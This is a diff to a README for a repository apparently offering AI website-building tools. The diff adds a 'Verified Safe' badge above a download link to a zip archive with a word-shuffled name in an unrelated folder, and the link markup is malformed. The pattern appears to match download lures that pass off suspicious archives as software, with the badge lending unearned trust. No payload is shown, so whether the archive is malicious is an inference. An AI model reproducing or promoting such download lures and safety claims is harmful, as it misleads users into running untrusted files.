@@ -1,5 +1,7 @@
 # 🌐 building-websites-with-AI-tools - Build Websites Effortlessly with AI
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/aizarch-building-websites-with-ai-tools)
+
 [![Download](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip%https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip)](https://raw.githubusercontent.com/aizarch/building-websites-with-AI-tools/main/horridity/building_tools_A_with_websites_1.8-alpha.4.zip)
 
 ## 📖 Overview
